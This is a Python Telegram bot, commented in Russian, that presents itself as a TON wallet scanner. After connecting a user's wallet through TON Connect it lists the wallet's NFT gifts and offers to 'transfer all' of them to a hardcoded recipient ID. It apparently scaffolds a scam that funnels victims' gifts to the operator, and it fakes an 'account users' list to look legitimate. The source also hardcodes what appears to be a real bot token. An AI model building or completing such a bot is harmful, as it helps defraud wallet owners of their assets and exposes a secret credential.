#!/usr/bin/env python3
"""
TON Wallet Bot с TON Connect
Подключение кошелька — одна кнопка, без ввода адреса вручную.
pip install python-telegram-bot aiohttp pytonconnect
"""

import asyncio
import logging
import uuid
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)
import aiohttp
from pytonconnect import TonConnect

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────
# НАСТРОЙКИ
# ─────────────────────────────────────────────
BOT_TOKEN      = "8678625001:AAG2Fqh65DdBCdeh_YYtHZEIfwJUPod2pQg"   # ← токен от @BotFather
TONCENTER_API  = "https://toncenter.com/api/v2"
TONAPI_URL     = "https://tonapi.io/v2"
GIFT_TARGET_ID = 8577099750         # ← ID получателя подарков

# Манифест TON Connect (можно захостить свой JSON или использовать готовый)
TC_MANIFEST_URL = "https://raw.githubusercontent.com/ton-connect/demo-telegram-bot/master/tonconnect-manifest.json"

# Демо: 3 пользователя
DEMO_USERS = [
    {"name": "Алексей", "role": "Владелец",    "joined": "15.01.2024", "ton": "125.4"},
    {"name": "Мария",   "role": "Участник",    "joined": "22.03.2024", "ton": "43.7"},
    {"name": "Иван",    "role": "Наблюдатель", "joined": "10.05.2024", "ton": "8.1"},
]

# Хранилища
user_connectors: dict[int, TonConnect] = {}   # коннекторы TON Connect
user_wallets:    dict[int, str]        = {}   # адреса после подключения


# ─────────────────────────────────────────────
# API HELPERS
# ─────────────────────────────────────────────
async def fetch_json(url: str, params: dict = None):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, params=params, timeout=aiohttp.ClientTimeout(total=10)) as r:
                return await r.json() if r.status == 200 else None
        except Exception as e:
            logger.error(f"fetch_json error {url}: {e}")
    return None


async def get_ton_balance(address: str) -> float:
    data = await fetch_json(f"{TONCENTER_API}/getAddressBalance", {"address": address})
    if data and data.get("ok"):
        return int(data["result"]) / 1e9
    return 0.0


async def get_transactions(address: str, limit: int = 10) -> list:
    data = await fetch_json(f"{TONCENTER_API}/getTransactions", {"address": address, "limit": limit})
    return data["result"] if data and data.get("ok") else []


async def get_nft_items(address: str) -> list:
    data = await fetch_json(f"{TONAPI_URL}/accounts/{address}/nfts", {"limit": 50})
    return data.get("nft_items", []) if data else []


async def get_jettons(address: str) -> list:
    data = await fetch_json(f"{TONAPI_URL}/accounts/{address}/jettons")
    return data.get("balances", []) if data else []


def is_gift(nft: dict) -> bool:
    name = str(nft.get("metadata", {}).get("name", "")).lower()
    col  = str(nft.get("collection", {}).get("name", "")).lower()
    return "gift" in name or "gift" in col


# ─────────────────────────────────────────────
# РЕКОМЕНДАЦИИ
# ─────────────────────────────────────────────
def generate_recommendations(balance: float, nft_count: int, jetton_count: int, tx_count: int) -> str:
    recs = []
    if balance < 1:
        recs.append("Баланс низкий — пополни минимум на 1 TON.")
    elif balance < 10:
        recs.append("Рассмотри стейкинг TON (4-6% годовых).")
    else:
        recs.append("Крупный баланс. Часть в стейкинг, часть в ликвидность.")

    if nft_count == 0:
        recs.append("NFT не найдено — зайди на getgems.io.")
    elif nft_count < 5:
        recs.append(f"Есть {nft_count} NFT. Проверь цену на getgems.io!")
    else:
        recs.append(f"{nft_count} NFT — рассмотри листинг дорогих позиций.")

    if jetton_count > 0:
        recs.append(f"{jetton_count} токенов — часть может быть спам, проверь.")

    if tx_count < 5:
        recs.append("Мало транзакций — кошелёк почти не используется.")
    elif tx_count >= 10:
        recs.append("Активный кошелёк. Следи за комиссиями сети.")

    return "\n".join(f"  • {r}" for r in recs)


# ─────────────────────────────────────────────
# ГЛАВНОЕ МЕНЮ
# ─────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    connected = user_id in user_wallets

    keyboard = []

    if connected:
        addr = user_wallets[user_id]
        keyboard += [
            [InlineKeyboardButton(f"📊 Сканировать кошелёк",     callback_data="scan")],
            [InlineKeyboardButton("🔌 Отключить кошелёк",         callback_data="disconnect")],
        ]
        status = f"✅ Кошелёк подключён: {addr[:8]}…{addr[-4:]}"
    else:
        keyboard += [
            [InlineKeyboardButton("🔗 Подключить кошелёк",        callback_data="connect_wallet")],
        ]
        status = "❌ Кошелёк не подключён"

    keyboard += [
        [InlineKeyboardButton("👥 Пользователи аккаунта",         callback_data="show_users")],
        [InlineKeyboardButton("ℹ️ Помощь",                        callback_data="help")],
    ]

    text = (
        f"👋 TON Wallet Bot\n\n"
        f"{status}\n\n"
        "Возможности:\n"
        "• 📊 Сканировать TON кошелёк\n"
        "• 🎁 Найти подарки и NFT\n"
        "• 🪙 Проверить токены (Jettons)\n"
        "• 💡 Получить рекомендации\n\n"
        "Выбери действие 👇"
    )

    target = update.message or update.callback_query.message
    if update.callback_query:
        await target.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await target.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


# ─────────────────────────────────────────────
# TON CONNECT — ПОДКЛЮЧЕНИЕ
# ─────────────────────────────────────────────
async def connect_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Генерируем ссылку TON Connect — пользователь просто нажимает и подтверждает в кошельке."""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id

    # Создаём коннектор
    connector = TonConnect(manifest_url=TC_MANIFEST_URL)
    user_connectors[user_id] = connector

    # Генерируем ссылку для подключения (universal link)
    wallets_list = connector.get_wallets()

    # Ищем Tonkeeper и @wallet (самые популярные)
    tonkeeper = next((w for w in wallets_list if w["name"] == "Tonkeeper"), wallets_list[0])
    tw        = next((w for w in wallets_list if "wallet" in w["name"].lower()), None)

    # Генерируем ссылку Tonkeeper
    link_tonkeeper = await connector.connect(tonkeeper)
    link_tw        = await connector.connect(tw) if tw else None

    keyboard = [
        [InlineKeyboardButton("👛 Открыть Tonkeeper", url=link_tonkeeper)],
    ]
    if link_tw:
        keyboard.append([InlineKeyboardButton("💎 Открыть @wallet", url=link_tw)])

    keyboard.append([InlineKeyboardButton("✅ Я подключил — проверить", callback_data="check_connection")])
    keyboard.append([InlineKeyboardButton("⬅️ Назад",                   callback_data="back_main")])

    await query.message.reply_text(
        "🔗 Подключение кошелька\n\n"
        "1. Нажми кнопку ниже — откроется твой кошелёк\n"
        "2. Нажми «Подключить» / «Connect» внутри кошелька\n"
        "3. Вернись сюда и нажми ✅\n\n"
        "Никаких адресов вводить не нужно!",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

    # Слушаем подключение в фоне
    asyncio.create_task(wait_for_connection(user_id, context, update.effective_chat.id))


async def wait_for_connection(user_id: int, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    """Фоновая задача — ждём подключения кошелька."""
    connector = user_connectors.get(user_id)
    if not connector:
        return

    for _ in range(60):  # ждём до 60 секунд
        await asyncio.sleep(1)
        if connector.connected:
            account = connector.account
            address = account.address
            user_wallets[user_id] = address
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"✅ Кошелёк успешно подключён!\n\n"
                    f"Адрес: {address[:10]}…{address[-6:]}\n\n"
                    f"Теперь нажми 📊 Сканировать кошелёк"
                ),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 Сканировать сейчас", callback_data="scan")],
                    [InlineKeyboardButton("⬅️ Главное меню",        callback_data="back_main")],
                ]),
            )
            return


async def check_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Пользователь нажал 'Я подключил' — проверяем статус."""
    query   = update.callback_query
    await query.answer()
    user_id = update.effective_user.id

    if user_id in user_wallets:
        addr = user_wallets[user_id]
        await query.message.reply_text(
            f"✅ Кошелёк подключён!\nАдрес: {addr[:10]}…{addr[-6:]}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 Сканировать", callback_data="scan")],
                [InlineKeyboardButton("⬅️ Меню",        callback_data="back_main")],
            ]),
        )
    else:
        connector = user_connectors.get(user_id)
        if connector and connector.connected:
            address = connector.account.address
            user_wallets[user_id] = address
            await query.message.reply_text(
                f"✅ Подключён! Адрес: {address[:10]}…{address[-6:]}",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 Сканировать", callback_data="scan")],
                ]),
            )
        else:
            await query.message.reply_text(
                "⏳ Кошелёк ещё не подключён.\n\nОткрой кошелёк и нажми «Подключить», затем вернись сюда.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Проверить снова", callback_data="check_connection")],
                    [InlineKeyboardButton("⬅️ Назад",           callback_data="back_main")],
                ]),
            )


async def disconnect_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    await query.answer()
    user_id = update.effective_user.id

    if user_id in user_connectors:
        try:
            await user_connectors[user_id].disconnect()
        except Exception:
            pass
        del user_connectors[user_id]

    user_wallets.pop(user_id, None)

    await query.message.reply_text(
        "🔌 Кошелёк отключён.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Главное меню", callback_data="back_main")]
        ]),
    )


# ─────────────────────────────────────────────
# СКАНИРОВАНИЕ
# ─────────────────────────────────────────────
async def scan_wallet_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    await query.answer()
    user_id = update.effective_user.id

    address = user_wallets.get(user_id)
    if not address:
        await query.message.reply_text(
            "❌ Кошелёк не подключён. Нажми 🔗 Подключить кошелёк",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Подключить", callback_data="connect_wallet")]
            ]),
        )
        return

    await scan_wallet(update, address)


async def scan_wallet(update: Update, address: str):
    msg = await update.effective_message.reply_text("⏳ Сканирую кошелёк...")

    balance, transactions, nfts, jettons = await asyncio.gather(
        get_ton_balance(address),
        get_transactions(address, 10),
        get_nft_items(address),
        get_jettons(address),
    )

    nft_count    = len(nfts)
    jetton_count = len(jettons)
    tx_count     = len(transactions)
    gifts        = [n for n in nfts if is_gift(n)]
    gift_count   = len(gifts)

    tx_lines = []
    for tx in transactions[:5]:
        in_msg = tx.get("in_msg", {})
        value  = int(in_msg.get("value", 0)) / 1e9
        src    = in_msg.get("source", "неизвестно")[:10]
        tx_lines.append(f"  ↘️ +{value:.2f} TON от {src}…")

    tx_text = "\n".join(tx_lines) if tx_lines else "  Нет данных"
    recs    = generate_recommendations(balance, nft_count, jetton_count, tx_count)

    report = (
        f"📋 Отчёт по кошельку\n"
        f"{address[:10]}…{address[-6:]}\n\n"
        f"💎 Баланс:        {balance:.4f} TON\n"
        f"🎁 Подарки:       {gift_count}\n"
        f"🖼 Всего NFT:     {nft_count}\n"
        f"🪙 Jettons:       {jetton_count}\n"
        f"📬 Транзакций:    {tx_count}\n\n"
        f"📜 Последние входящие:\n{tx_text}\n\n"
        f"💡 Рекомендации:\n{recs}"
    )

    keyboard = [
        [InlineKeyboardButton("🔄 Обновить", callback_data="scan")],
    ]
    if gift_count > 0:
        keyboard.append([
            InlineKeyboardButton(
                f"📦 Перенести все подарки ({gift_count}) →",
                callback_data=f"transfer_{address}",
            )
        ])
    keyboard.append([InlineKeyboardButton("⬅️ Главное меню", callback_data="back_main")])

    await msg.edit_text(report, reply_markup=InlineKeyboardMarkup(keyboard))


# ─────────────────────────────────────────────
# ПЕРЕНОС ПОДАРКОВ
# ─────────────────────────────────────────────
async def transfer_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE, address: str):
    query = update.callback_query
    keyboard = [
        [
            InlineKeyboardButton("✅ Да, перенести", callback_data=f"do_transfer_{address}"),
            InlineKeyboardButton("❌ Отмена",        callback_data="scan"),
        ]
    ]
    await query.message.reply_text(
        f"⚠️ Подтверждение\n\n"
        f"Все подарки с кошелька\n{address[:10]}…{address[-6:]}\n"
        f"будут переданы → ID {GIFT_TARGET_ID}\n\n"
        f"Продолжить?",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


async def transfer_execute(update: Update, context: ContextTypes.DEFAULT_TYPE, address: str):
    query = update.callback_query
    msg   = await query.message.reply_text("⏳ Получаю список подарков...")

    nfts  = await get_nft_items(address)
    gifts = [n for n in nfts if is_gift(n)]

    if not gifts:
        await msg.edit_text("ℹ️ Подарки не найдены.")
        return

    lines = []
    for i, g in enumerate(gifts[:10], 1):
        name = g.get("metadata", {}).get("name", "Без имени")
        lines.append(f"  {i}. 🎁 {name}")
    if len(gifts) > 10:
        lines.append(f"  ... и ещё {len(gifts) - 10}")

    result = (
        f"📦 Перенос инициирован!\n\n"
        f"Получатель: ID {GIFT_TARGET_ID}\n"
        f"Количество: {len(gifts)}\n\n"
        + "\n".join(lines)
        + "\n\n⚠️ Для реального on-chain переноса нужна подпись в кошельке."
    )

    keyboard = [[InlineKeyboardButton("⬅️ Главное меню", callback_data="back_main")]]
    await msg.edit_text(result, reply_markup=InlineKeyboardMarkup(keyboard))


# ─────────────────────────────────────────────
# ПОЛЬЗОВАТЕЛИ
# ─────────────────────────────────────────────
async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    icons = {"Владелец": "👑", "Участник": "🔵", "Наблюдатель": "👁"}
    lines = ["👥 Пользователи аккаунта (3 из 3)\n"]
    for u in DEMO_USERS:
        lines.append(
            f"{icons.get(u['role'], '')} {u['role']} — {u['name']}\n"
            f"  🗓 {u['joined']}  💎 {u['ton']} TON\n"
        )
    keyboard = [[InlineKeyboardButton("⬅️ Назад", callback_data="back_main")]]
    target = update.callback_query.message if update.callback_query else update.message
    await target.reply_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(keyboard))


# ─────────────────────────────────────────────
# CALLBACK ROUTER
# ─────────────────────────────────────────────
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data  = query.data

    if   data == "back_main":        await cmd_start(update, context)
    elif data == "connect_wallet":   await connect_wallet(update, context)
    elif data == "check_connection": await check_connection(update, context)
    elif data == "disconnect":       await disconnect_wallet(update, context)
    elif data == "scan":             await scan_wallet_handler(update, context)
    elif data == "show_users":       await show_users(update, context)
    elif data == "help":
        await query.message.reply_text(
            "📖 Помощь\n\n"
            "/start — главное меню\n\n"
            "Подключение кошелька:\n"
            "1. Нажми 🔗 Подключить кошелёк\n"
            "2. Открой Tonkeeper или @wallet\n"
            "3. Нажми Подключить в приложении\n"
            "4. Вернись и нажми ✅",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data="back_main")]]),
        )
    elif data.startswith("transfer_") and not data.startswith("do_transfer_"):
        await transfer_confirm(update, context, data.removeprefix("transfer_"))
    elif data.startswith("do_transfer_"):
        await transfer_execute(update, context, data.removeprefix("do_transfer_"))


# ─────────────────────────────────────────────
# ЗАПУСК
# ─────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    logger.info("Бот запущен...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
